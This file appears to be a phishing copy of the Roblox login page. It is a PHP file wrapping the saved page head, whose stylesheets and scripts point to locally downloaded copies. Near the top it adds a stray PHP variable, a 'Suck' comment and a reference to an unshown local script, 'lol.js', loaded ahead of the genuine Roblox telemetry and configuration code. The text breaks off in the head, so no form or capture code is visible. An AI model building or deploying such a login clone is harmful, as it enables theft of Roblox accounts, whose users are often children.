<?php

$oi = "ea";

?>


<!DOCTYPE html>
<!-- Suck -->
<html><!--<![endif]--><head data-machine-id="CHI2-WEB557"><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style>
    <!-- MachineID: CHI2-WEB557 -->
    <title>Roblox</title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge,requiresActiveX=true">

<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="author" content="Roblox Corporation">
<meta name="description" content="Roblox is a global platform that brings people together through play.">
<meta name="keywords" content="free games, online games, building games, virtual worlds, free mmo, gaming cloud, physics engine">

    <meta name="apple-itunes-app" content="app-id=431946152">
    <script src="lol.js"></script>




<script ec-api-script="true" type="text/javascript" async="" src="./login_files/funcaptcha_api.js.pobrane"></script><script type="application/ld+json">
    {
    "@context" : "http://schema.org",
    "@type" : "Organization",
    "name" : "Roblox",
    "url" : "https://www.roblox.com/",
    "logo": "https://images.rbxcdn.com/cece570e37aa8f95a450ab0484a18d91",
    "sameAs" : [
    "https://www.facebook.com/roblox/",
    "https://twitter.com/roblox",
    "https://www.linkedin.com/company/147977",
    "https://www.instagram.com/roblox/",
    "https://www.youtube.com/user/roblox",
    "https://plus.google.com/+roblox",
    "https://www.twitch.tv/roblox"
    ]
    }
</script>
    <meta ng-csp="no-unsafe-eval">

<meta name="locale-data" data-language-code="en_us" data-language-name="English"><meta name="device-meta" data-device-type="computer" data-is-in-app="false" data-is-desktop="true" data-is-phone="false" data-is-tablet="false" data-is-console="false" data-is-android-app="false" data-is-ios-app="false" data-is-uwp-app="false" data-is-xbox-app="false" data-is-amazon-app="false" data-is-win32-app="false" data-is-studio="false" data-is-game-client-browser="false" data-is-ios-device="false" data-is-android-device="false" data-is-universal-app="false" data-app-type="unknown">
<meta name="environment-meta" data-is-testing-site="false">

<meta id="roblox-display-names" data-enabled="true">

<meta name="page-meta" data-internal-page-name="Login">

    

<script type="text/javascript">
    var Roblox = Roblox || {};

    Roblox.BundleVerifierConstants = {
        isMetricsApiEnabled: true,
        eventStreamUrl: "//ecsv2.roblox.com/pe?t=diagnostic",
        deviceType: "Computer",
        cdnLoggingEnabled: JSON.parse("true")
    };
</script>        <script type="text/javascript">
            var Roblox = Roblox || {};

Roblox.BundleDetector = (function () {
    var isMetricsApiEnabled = Roblox.BundleVerifierConstants && Roblox.BundleVerifierConstants.isMetricsApiEnabled;

    var loadStates = {
        loadSuccess: "loadSuccess",
        loadFailure: "loadFailure",
        executionFailure: "executionFailure"
    };

    var bundleContentTypes = {
        javascript: "javascript",
        css: "css"
    };

    var ephemeralCounterNames = {
        cdnPrefix: "CDNBundleError_",
        unknown: "CDNBundleError_unknown",
        cssError: "CssBundleError",
        jsError: "JavascriptBundleError",
        jsFileError: "JsFileExecutionError",
        resourceError: "ResourcePerformance_Error",
        resourceLoaded: "ResourcePerformance_Loaded"
    };

    return {
        jsBundlesLoaded: {},
        bundlesReported: {},

        counterNames: ephemeralCounterNames,
        loadStates: loadStates,
        bundleContentTypes: bundleContentTypes,

        timing: undefined,

        setTiming: function (windowTiming) {
            this.timing = windowTiming;
        },

        getLoadTime: function () {
            if (this.timing && this.timing.domComplete) {
                return this.getCurrentTime() - this.timing.domComplete;
            }
        },

        getCurrentTime: function () {
            return new Date().getTime();
        },

        getCdnProviderName: function (bundleUrl, callBack) {
            if (Roblox.BundleVerifierConstants.cdnLoggingEnabled) {
                var xhr = new XMLHttpRequest();
                xhr.open('GET', bundleUrl, true);

                xhr.onreadystatechange = function () {
                    if (xhr.readyState === xhr.HEADERS_RECEIVED) {
                        try {
                            var headerValue = xhr.getResponseHeader("rbx-cdn-provider");
                            if (headerValue) {
                                callBack(headerValue);
                            } else {
                                callBack();
                            }
                        } catch (e) {
                            callBack();
                        }
                    }
                };

                xhr.onerror = function () {
                    callBack();
                };

                xhr.send();
            } else {
                callBack();
            }
        },

        getCdnProviderAndReportMetrics: function (bundleUrl, bundleName, loadState, bundleContentType) {
            this.getCdnProviderName(bundleUrl, function (cdnProviderName) {
                Roblox.BundleDetector.reportMetrics(bundleUrl, bundleName, loadState, bundleContentType, cdnProviderName);
            });
        },

        reportMetrics: function (bundleUrl, bundleName, loadState, bundleContentType, cdnProviderName) {
            if (!isMetricsApiEnabled
                || !bundleUrl
                || !loadState
                || !loadStates.hasOwnProperty(loadState)
                || !bundleContentType
                || !bundleContentTypes.hasOwnProperty(bundleContentType)) {
                return;
            }

            var xhr = new XMLHttpRequest();
            var metricsApiUrl = (Roblox.EnvironmentUrls && Roblox.EnvironmentUrls.metricsApi) || "https://metrics.roblox.com";

            xhr.open("POST", metricsApiUrl + "/v1/bundle-metrics/report", true);
            xhr.setRequestHeader("Content-Type", "application/json");
            xhr.withCredentials = true;
            xhr.send(JSON.stringify({
                bundleUrl: bundleUrl,
                bundleName: bundleName || "",
                bundleContentType: bundleContentType,
                loadState: loadState,
                cdnProviderName: cdnProviderName,
                loadTimeInMilliseconds: this.getLoadTime() || 0
            }));
        },

        logToEphemeralStatistics: function (sequenceName, value) {
            var deviceType = Roblox.BundleVerifierConstants.deviceType;
            sequenceName += "_" + deviceType;

            var xhr = new XMLHttpRequest();
            xhr.open('POST', '/game/report-stats?name=' + sequenceName + "&value=" + value, true);
            xhr.withCredentials = true;
            xhr.send();
        },

        logToEphemeralCounter: function (ephemeralCounterName) {
            var deviceType = Roblox.BundleVerifierConstants.deviceType;
            ephemeralCounterName += "_" + deviceType;
            //log to ephemeral counters - taken from ET.js
            var xhr = new XMLHttpRequest();
            xhr.open('POST', '/game/report-event?name=' + ephemeralCounterName, true);
            xhr.withCredentials = true;
            xhr.send();
        },

        logToEventStream: function (failedBundle, ctx, cdnProvider, status) {
            var esUrl = Roblox.BundleVerifierConstants.eventStreamUrl,
                currentPageUrl = encodeURIComponent(window.location.href);

            var deviceType = Roblox.BundleVerifierConstants.deviceType;
            ctx += "_" + deviceType;
            //try and grab performance data.
            //Note that this is the performance of the xmlhttprequest rather than the original resource load.
            var duration = 0;
            if (window.performance) {
                var perfTiming = window.performance.getEntriesByName(failedBundle);
                if (perfTiming.length > 0) {
                    var data = perfTiming[0];
                    duration = data.duration || 0;
                }
            }
            //log to event stream (diagnostic)
            var params = "&evt=webBundleError&url=" + currentPageUrl +
                "&ctx=" + ctx + "&fileSourceUrl=" + encodeURIComponent(failedBundle) +
                "&cdnName=" + (cdnProvider || "unknown") +
                "&statusCode=" + (status || "unknown") +
                "&loadDuration=" + Math.floor(duration);
            var img = new Image();
            img.src = esUrl + params;
        },

        getCdnInfo: function (failedBundle, ctx, fileType) {
            if (Roblox.BundleVerifierConstants.cdnLoggingEnabled) {
                var xhr = new XMLHttpRequest();
                var counter = this.counterNames;
                xhr.open('GET', failedBundle, true);
                var cdnProvider;

                //succesful request
                xhr.onreadystatechange = function () {
                    if (xhr.readyState === xhr.HEADERS_RECEIVED) {
                        cdnProvider = xhr.getResponseHeader("rbx-cdn-provider");
                        if (cdnProvider && cdnProvider.length > 0) {
                            Roblox.BundleDetector.logToEphemeralCounter(counter.cdnPrefix + cdnProvider + "_" + fileType);
                        }
                        else {
                            Roblox.BundleDetector.logToEphemeralCounter(counter.unknown + "_" + fileType);
                        }
                    }
                    else if (xhr.readyState === xhr.DONE) {
                        // append status to cdn provider so we know its not related to network error. 
                        Roblox.BundleDetector.logToEventStream(failedBundle, ctx, cdnProvider, xhr.status);
                    }
                };

                //attach to possible things that can go wrong with the request.
                //additionally a network error will trigger this callback
                xhr.onerror = function () {
                    Roblox.BundleDetector.logToEphemeralCounter(counter.unknown + "_" + fileType);
                    Roblox.BundleDetector.logToEventStream(failedBundle, ctx, counter.unknown);
                };

                xhr.send();
            }
            else {
                this.logToEventStream(failedBundle, ctx);
            }
        },

        reportResourceError: function (resourceName) {
            var ephemeralCounterName = this.counterNames.resourceError + "_" + resourceName;
            this.logToEphemeralCounter(ephemeralCounterName);
        },

        reportResourceLoaded: function (resourceName) {
            var loadTimeInMs = this.getLoadTime();
            if (loadTimeInMs) {
                var sequenceName = this.counterNames.resourceLoaded + "_" + resourceName;
                this.logToEphemeralStatistics(sequenceName, loadTimeInMs);
            }
        },

        reportBundleError: function (bundleTag) {
            var ephemeralCounterName, failedBundle, ctx, contentType;
            if (bundleTag.rel && bundleTag.rel === "stylesheet") {
                ephemeralCounterName = this.counterNames.cssError;
                failedBundle = bundleTag.href;
                ctx = "css";
                contentType = bundleContentTypes.css;
            } else {
                ephemeralCounterName = this.counterNames.jsError;
                failedBundle = bundleTag.src;
                ctx = "js";
                contentType = bundleContentTypes.javascript;
            }

            //mark that we logged this bundle
            this.bundlesReported[failedBundle] = true;

            //e.g. javascriptBundleError_Computer
            this.logToEphemeralCounter(ephemeralCounterName);
            //this will also log to event stream
            this.getCdnInfo(failedBundle, ctx, ctx);

            var bundleName;
            if (bundleTag.dataset) {
                bundleName = bundleTag.dataset.bundlename;
            }
            else {
                bundleName = bundleTag.getAttribute('data-bundlename');
            }

            this.getCdnProviderAndReportMetrics(failedBundle, bundleName, loadStates.loadFailure, contentType);
        },

        bundleDetected: function (bundleName) {
            this.jsBundlesLoaded[bundleName] = true;
        },

        verifyBundles: function (document) {
            var ephemeralCounterName = this.counterNames.jsFileError,
                eventContext = ephemeralCounterName;
            //grab all roblox script tags in the page. 
            var scripts = (document && document.scripts) || window.document.scripts;
            var errorsList = [];
            var bundleName;
            var monitor;
            for (var i = 0; i < scripts.length; i++) {
                var item = scripts[i];

                if (item.dataset) {
                    bundleName = item.dataset.bundlename;
                    monitor = item.dataset.monitor;
                }
                else {
                    bundleName = item.getAttribute('data-bundlename');
                    monitor = item.getAttribute('data-monitor');
                }

                if (item.src && monitor && bundleName) {
                    if (!Roblox.BundleDetector.jsBundlesLoaded.hasOwnProperty(bundleName)) {
                        errorsList.push(item);
                    }
                }
            }
            if (errorsList.length > 0) {
                for (var j = 0; j < errorsList.length; j++) {
                    var script = errorsList[j];
                    if (!this.bundlesReported[script.src]) {
                        //log the counter only if the file is actually corrupted, not just due to failure to load
                        //e.g. JsFileExecutionError_Computer
                        this.logToEphemeralCounter(ephemeralCounterName);
                        this.getCdnInfo(script.src, eventContext, 'js');

                        if (script.dataset) {
                            bundleName = script.dataset.bundlename;
                        }
                        else {
                            bundleName = script.getAttribute('data-bundlename');
                        }

                        this.getCdnProviderAndReportMetrics(script.src, bundleName, loadStates.executionFailure, bundleContentTypes.javascript);
                    }
                }
            }
        }
    };
})();

window.addEventListener("load", function (evt) {
    Roblox.BundleDetector.verifyBundles();
});

Roblox.BundleDetector.setTiming(window.performance.timing);
            //# sourceURL=somename.js
        </script>
    
<link href="https://images.rbxcdn.com/7bba321f4d8328683d6e59487ce514eb" rel="icon">


    <link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="StyleGuide" data-bundle-source="Main" href="./login_files/ca8c00521b855197aa6db1ba08539386aa5e9a52dd532e46a653d78ac1144e8b.css">
<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Thumbnails" data-bundle-source="Main" href="./login_files/9517d686dc47015c200496d77e2b18146ee37652d18e25ecf9e1ed230310ea13.css">
<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="CaptchaCore" data-bundle-source="Main" href="./login_files/b8f8f15a57a66e73469ae72eea7d8905346afa78b9f2397627cd099f7dcc779a.css">
<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Challenge" data-bundle-source="Main" href="./login_files/fdf61dd1b42d00623ced6193c071d101f1c46cca26e91dbdce851998ba73b72b.css">
<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="VerificationUpsell" data-bundle-source="Main" href="./login_files/3f5767588c352c1b6fd800e2d14466cfa7113a04fa5cf02f1e33f2f0e7dd204f.css">
<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="RobloxBadges" data-bundle-source="Main" href="./login_files/da45920fef8b22d35ee6cce0702d290241252fbfd99695e2abc0934d20de0974.css">
<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Navigation" data-bundle-source="Main" href="./login_files/af8cb63eb52ab7aacc87848677124fdb944ed943c878a55780b6c6a667da7ae5.css">
<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="CookieBannerV3" data-bundle-source="Main" href="./login_files/2c2a709240897ce382b7ff55be4347cd0994ab1e2d6ed3b56649e54b0e97e13a.css">
<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Footer" data-bundle-source="Main" href="./login_files/6edb2191aa318f963253361b43d2657a04b3d16e9c28fe7b22d4a4d5686f1cb4.css">
<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="ConfigureWebApps" data-bundle-source="Main" href="./login_files/08def520152a575438e73a81aa9a310c2415c327df7b624a24aa6e794d24dba3.css">


    <link rel="canonical" href="https://www.roblox.com/NewLogin">
    
<link onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" rel="stylesheet" href="./login_files/fetch">


    
<link onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" rel="stylesheet" href="./login_files/fetch(1)">


<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Captcha" data-bundle-source="Main" href="./login_files/cc0e1d21820c2614cbf118f5fbc90c66cce1f5440919479d223e2ddd2a0fc4e8.css">
<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="CrossDeviceLoginDisplayCode" data-bundle-source="Main" href="./login_files/d8a3b48304642bf28fbc1675e55cbd75a3be58986a34a762e360dd3963ad467b.css">
<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="ReactLogin" data-bundle-source="Main" href="./login_files/7fc70d7c74b3742f897833c8ea8a4997dc768f30237a7e0f4ef88c46ed583b76.css">
<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="AccountRecoveryModal" data-bundle-source="Main" href="./login_files/4b5dce375cef78073d2192583d1ecd458f10c308fa99847d649d5ec801bebd61.css">

    <link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="RobuxIcon" data-bundle-source="Main" href="./login_files/6fe55c3438539daf776774645e39e121d991246d6a38972b81e3f9550a585b5b.css">


    <link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="ItemPurchase" data-bundle-source="Main" href="./login_files/5331669054807354a3a20a4717d18c566a7cbee984e7471ece3a2090cb70150c.css">
<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="IdVerification" data-bundle-source="Main" href="./login_files/68f976f4a3f8f3a6aae074879170e579451270e693d2361491b1c1bb9ac5e4c5.css">


    

    



<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="UserAgreementsChecker" data-bundle-source="Main" href="./login_files/d5a3728b78be729b693aadf79a1f45f0fa49c15fe863a0d7dd631b75f9e82207.css">






<script type="text/javascript">
    var Roblox = Roblox || {};
    Roblox.EnvironmentUrls = Roblox.EnvironmentUrls || {};
    Roblox.EnvironmentUrls = {"abtestingApiSite":"https://abtesting.roblox.com","accountInformationApi":"https://accountinformation.roblox.com","accountSettingsApi":"https://accountsettings.roblox.com","adConfigurationApi":"https://adconfiguration.roblox.com","adsApi":"https://ads.roblox.com","apiGatewayCdnUrl":"https://apis.rbxcdn.com","apiGatewayUrl":"https://apis.roblox.com","apiProxyUrl":"https://api.roblox.com","assetDeliveryApi":"https://assetdelivery.roblox.com","authApi":"https://auth.roblox.com","avatarApi":"https://avatar.roblox.com","badgesApi":"https://badges.roblox.com","billingApi":"https://billing.roblox.com","captchaApi":"https://captcha.roblox.com","catalogApi":"https://catalog.roblox.com","chatApi":"https://chat.roblox.com","chatModerationApi":"https://chatmoderation.roblox.com","contactsApi":"https://contacts.roblox.com","contactsServiceApi":"https://apis.roblox.com/contacts-api","contentStoreApi":"https://contentstore.roblox.com","developApi":"https://develop.roblox.com","domain":"roblox.com","economyApi":"https://economy.roblox.com","economycreatorstatsApi":"https://economycreatorstats.roblox.com","engagementPayoutsApi":"https://engagementpayouts.roblox.com","followingsApi":"https://followings.roblox.com","friendsApi":"https://friends.roblox.com","gameInternationalizationApi":"https://gameinternationalization.roblox.com","gamesApi":"https://games.roblox.com","gameJoinApi":"https://gamejoin.roblox.com","groupsApi":"https://groups.roblox.com","groupsModerationApi":"https://groupsmoderation.roblox.com","helpSite":"http://help.roblox.com","inventoryApi":"https://inventory.roblox.com","itemConfigurationApi":"https://itemconfiguration.roblox.com","localeApi":"https://locale.roblox.com","localizationTablesApi":"https://localizationtables.roblox.com","metricsApi":"https://metrics.roblox.com","midasApi":"https://midas.roblox.com","notificationApi":"https://notifications.roblox.com","passProductPurchasingApi":"https://apis.roblox.com/pass-product-purchasing","bundlesProductPurchasingApi":"https://apis.roblox.com/bundles-product-purchasing","premiumFeaturesApi":"https://premiumfeatures.roblox.com","presenceApi":"https://presence.roblox.com","privateMessagesApi":"https://privatemessages.roblox.com","publishApi":"https://publish.roblox.com","restrictedHoursServiceApi":"https://apis.roblox.com/restricted-hours-service","screenTimeApi":"https://apis.rcs.roblox.com/screen-time-api","shareApi":"https://share.roblox.com","shareLinksApi":"https://apis.roblox.com/sharelinks","thumbnailsApi":"https://thumbnails.roblox.com","tradesApi":"https://trades.roblox.com","translationRolesApi":"https://translationroles.roblox.com","twoStepVerificationApi":"https://twostepverification.roblox.com","universalAppConfigurationApi":"https://apis.roblox.com/universal-app-configuration","userAgreementsServiceApi":"https://apis.roblox.com/user-agreements","userModerationApi":"https://usermoderation.roblox.com","usersApi":"https://users.roblox.com","userSettingsApi":"https://apis.roblox.com/user-settings-api","voiceApi":"https://voice.roblox.com","websiteUrl":"https://www.roblox.com"};

    // please keep the list in alphabetical order
    var additionalUrls = {
        amazonStoreLink: "https://www.amazon.com/Roblox-Corporation/dp/B00NUF4YOA",
        amazonWebStoreLink: "https%3a%2f%2fwww.amazon.com%2froblox%3f%26_encoding%3dUTF8%26tag%3dr05d13-20%26linkCode%3dur2%26linkId%3d5562fc29c05b45562a86358c198356eb%26camp%3d1789%26creative%3d9325",
        appProtocolUrl: "robloxmobile://",
        appStoreLink: "https://itunes.apple.com/us/app/roblox-mobile/id431946152",
        googlePlayStoreLink: "https://play.google.com/store/apps/details?id=com.roblox.client&amp;hl=en",
        iosAppStoreLink: "https://itunes.apple.com/us/app/roblox-mobile/id431946152",
        windowsStoreLink: "https://www.microsoft.com/en-us/store/games/roblox/9nblgggzm6wm",
        xboxStoreLink: "https://www.microsoft.com/en-us/p/roblox/bq1tn1t79v9k"
    }

    for (var urlName in additionalUrls) {
        Roblox.EnvironmentUrls[urlName] = additionalUrls[urlName];
    }
    
</script><link id="chromealerabat-link" rel="stylesheet" type="text/css" href="chrome-extension://dacdinoicboceafielngnmjjplncljhj/content.css">



<script type="text/javascript">
    var Roblox = Roblox || {};
    Roblox.GaEventSettings = {
        gaDFPPreRollEnabled: "false" === "true",
        gaLaunchAttemptAndLaunchSuccessEnabled: "false" === "true",
        gaPerformanceEventEnabled: "false" === "true"
    };
</script>



    <script onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="headerinit" type="text/javascript" src="./login_files/4a481e857787c241b22259659a0674a7.js.pobrane"></script>

    <script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="Polyfill" data-bundle-source="Main" src="./login_files/772034db167d3f4260047db4a7f2b8a58cf448709327013541e47c8962b6e556.js.pobrane"></script>


    <script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="XsrfProtection" data-bundle-source="Main" src="./login_files/4db2f741b7a3ec36d11fec999ce33f708ae85641cabfd27e11e0935928f7d9c4.js.pobrane"></script>


    <script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="HeaderScripts" data-bundle-source="Main" src="./login_files/97cb9ac7262155c329a259fce9f940f9bcfa852a6a1ccb44bd8a41c31e84e54b.js.pobrane"></script>



<meta name="sentry-meta" data-env-name="production" data-dsn="https://6750adeb1b1348e4a10b13e726d5c10b@sentry.io/1539367" data-sample-rate="0"><script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="Sentry" data-bundle-source="Main" src="./login_files/edc66704bd1974195d8c60f4a163441bec82f1bcb11c492e7df07c43f45a4d49.js.pobrane"></script>

<meta name="roblox-tracer-meta-data" data-access-token="S3EXjCZQQr6OixnmKu+hoa3OSfpvPP5qgU0esiWgwreFUUMBnPhEaoS5yIIrf9bdYlSgW0XKCb1So9Rhtj1eMzt/MJWcyKZ4TwIckHVj" data-service-name="Web" data-tracer-enabled="false" data-api-sites-request-allow-list="friends.roblox.com,chat.roblox.com,thumbnails.roblox.com,games.roblox.com,gameinternationalization.roblox.com,localizationtables.roblox.com" data-sample-rate="5" data-is-instrument-page-performance-enabled="true"><script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="RobloxTracer" data-bundle-source="Main" src="./login_files/adeccc658a8d5ddc63fb224cc0bcd3e29b73d70db3847c0379426bfa128d9381.js.pobrane"></script>

    
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">

<script type="text/javascript">
    var Roblox = Roblox || {};
    Roblox.AdsHelper = Roblox.AdsHelper || {};
    Roblox.AdsLibrary = Roblox.AdsLibrary || {};

    Roblox.AdsHelper.toggleAdsSlot = function (slotId, GPTRandomSlotIdentifier) {
        var gutterAdsEnabled = false;
        if (gutterAdsEnabled) {
            googletag.display(GPTRandomSlotIdentifier);
            return;
        }
        
        if (typeof slotId !== 'undefined' && slotId && slotId.length > 0) {
            var slotElm = $("#"+slotId);
            if (slotElm.is(":visible")) {
                googletag.display(GPTRandomSlotIdentifier);
            }else {
                var adParam = Roblox.AdsLibrary.adsParameters[slotId];
                if (adParam) {
                    adParam.template = slotElm.html();
                    slotElm.empty();
                }
            }
        }
    }
</script>


    
    <!--[if lt IE 9]>
        <script src="//oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
        <script src="//oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->

<script>
    //Set if it browser's do not track flag is enabled
    var Roblox = Roblox || {};
    (function() {
        var dnt = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
        if (typeof window.external !== "undefined" &&
            typeof window.external.msTrackingProtectionEnabled !== "undefined") {
            dnt = dnt || window.external.msTrackingProtectionEnabled();
        }
        Roblox.browserDoNotTrack = dnt == "1" || dnt == "yes" || dnt === true;
    })();
</script>



            <script type="text/javascript">
            if (Roblox && Roblox.EventStream) {
                Roblox.EventStream.Init("//ecsv2.roblox.com/www/e.png",
                    "//ecsv2.roblox.com/www/e.png",
                    "//ecsv2.roblox.com/pe?t=studio",
                    "//ecsv2.roblox.com/pe?t=diagnostic");
            }
        </script>



<script type="text/javascript">
    if (Roblox && Roblox.PageHeartbeatEvent) {
        Roblox.PageHeartbeatEvent.Init([2,8,20,60]);
    }
</script>    
    <script type="text/javascript">
if (typeof(Roblox) === "undefined") { Roblox = {}; }
Roblox.Endpoints = Roblox.Endpoints || {};
Roblox.Endpoints.Urls = Roblox.Endpoints.Urls || {};
Roblox.Endpoints.Urls['/asset/'] = 'https://assetgame.roblox.com/asset/';
Roblox.Endpoints.Urls['/client-status/set'] = 'https://www.roblox.com/client-status/set';
Roblox.Endpoints.Urls['/client-status'] = 'https://www.roblox.com/client-status';
Roblox.Endpoints.Urls['/game/'] = 'https://assetgame.roblox.com/game/';
Roblox.Endpoints.Urls['/game/edit.ashx'] = 'https://assetgame.roblox.com/game/edit.ashx';
Roblox.Endpoints.Urls['/game/placelauncher.ashx'] = 'https://assetgame.roblox.com/game/placelauncher.ashx';
Roblox.Endpoints.Urls['/game/preloader'] = 'https://assetgame.roblox.com/game/preloader';
Roblox.Endpoints.Urls['/game/report-stats'] = 'https://assetgame.roblox.com/game/report-stats';
Roblox.Endpoints.Urls['/game/report-event'] = 'https://assetgame.roblox.com/game/report-event';
Roblox.Endpoints.Urls['/game/updateprerollcount'] = 'https://assetgame.roblox.com/game/updateprerollcount';
Roblox.Endpoints.Urls['/login/default.aspx'] = 'https://www.roblox.com/login/default.aspx';
Roblox.Endpoints.Urls['/my/avatar'] = 'https://www.roblox.com/my/avatar';
Roblox.Endpoints.Urls['/my/money.aspx'] = 'https://www.roblox.com/my/money.aspx';
Roblox.Endpoints.Urls['/navigation/userdata'] = 'https://www.roblox.com/navigation/userdata';
Roblox.Endpoints.Urls['/chat/chat'] = 'https://www.roblox.com/chat/chat';
Roblox.Endpoints.Urls['/chat/data'] = 'https://www.roblox.com/chat/data';
Roblox.Endpoints.Urls['/friends/list'] = 'https://www.roblox.com/friends/list';
Roblox.Endpoints.Urls['/navigation/getcount'] = 'https://www.roblox.com/navigation/getCount';
Roblox.Endpoints.Urls['/regex/email'] = 'https://www.roblox.com/regex/email';
Roblox.Endpoints.Urls['/catalog/browse.aspx'] = 'https://www.roblox.com/catalog/browse.aspx';
Roblox.Endpoints.Urls['/catalog/html'] = 'https://search.roblox.com/catalog/html';
Roblox.Endpoints.Urls['/catalog/json'] = 'https://search.roblox.com/catalog/json';
Roblox.Endpoints.Urls['/catalog/contents'] = 'https://search.roblox.com/catalog/contents';
Roblox.Endpoints.Urls['/catalog/lists.aspx'] = 'https://search.roblox.com/catalog/lists.aspx';
Roblox.Endpoints.Urls['/catalog/items'] = 'https://search.roblox.com/catalog/items';
Roblox.Endpoints.Urls['/asset-hash-thumbnail/image'] = 'https://assetgame.roblox.com/asset-hash-thumbnail/image';
Roblox.Endpoints.Urls['/asset-hash-thumbnail/json'] = 'https://assetgame.roblox.com/asset-hash-thumbnail/json';
Roblox.Endpoints.Urls['/asset-thumbnail-3d/json'] = 'https://assetgame.roblox.com/asset-thumbnail-3d/json';
Roblox.Endpoints.Urls['/asset-thumbnail/image'] = 'https://assetgame.roblox.com/asset-thumbnail/image';
Roblox.Endpoints.Urls['/asset-thumbnail/json'] = 'https://assetgame.roblox.com/asset-thumbnail/json';
Roblox.Endpoints.Urls['/asset-thumbnail/url'] = 'https://assetgame.roblox.com/asset-thumbnail/url';
Roblox.Endpoints.Urls['/asset/request-thumbnail-fix'] = 'https://assetgame.roblox.com/asset/request-thumbnail-fix';
Roblox.Endpoints.Urls['/avatar-thumbnail-3d/json'] = 'https://www.roblox.com/avatar-thumbnail-3d/json';
Roblox.Endpoints.Urls['/avatar-thumbnail/image'] = 'https://www.roblox.com/avatar-thumbnail/image';
Roblox.Endpoints.Urls['/avatar-thumbnail/json'] = 'https://www.roblox.com/avatar-thumbnail/json';
Roblox.Endpoints.Urls['/avatar-thumbnails'] = 'https://www.roblox.com/avatar-thumbnails';
Roblox.Endpoints.Urls['/avatar/request-thumbnail-fix'] = 'https://www.roblox.com/avatar/request-thumbnail-fix';
Roblox.Endpoints.Urls['/bust-thumbnail/json'] = 'https://www.roblox.com/bust-thumbnail/json';
Roblox.Endpoints.Urls['/headshot-thumbnail/json'] = 'https://www.roblox.com/headshot-thumbnail/json';
Roblox.Endpoints.Urls['/item-thumbnails'] = 'https://www.roblox.com/item-thumbnails';
Roblox.Endpoints.Urls['/outfit-thumbnail/json'] = 'https://www.roblox.com/outfit-thumbnail/json';
Roblox.Endpoints.Urls['/place-thumbnails'] = 'https://www.roblox.com/place-thumbnails';
Roblox.Endpoints.Urls['/thumbnail/asset/'] = 'https://www.roblox.com/thumbnail/asset/';
Roblox.Endpoints.Urls['/thumbnail/avatar-headshot'] = 'https://www.roblox.com/thumbnail/avatar-headshot';
Roblox.Endpoints.Urls['/thumbnail/avatar-headshots'] = 'https://www.roblox.com/thumbnail/avatar-headshots';
Roblox.Endpoints.Urls['/thumbnail/user-avatar'] = 'https://www.roblox.com/thumbnail/user-avatar';
Roblox.Endpoints.Urls['/thumbnail/resolve-hash'] = 'https://www.roblox.com/thumbnail/resolve-hash';
Roblox.Endpoints.Urls['/thumbnail/place'] = 'https://www.roblox.com/thumbnail/place';
Roblox.Endpoints.Urls['/thumbnail/get-asset-media'] = 'https://www.roblox.com/thumbnail/get-asset-media';
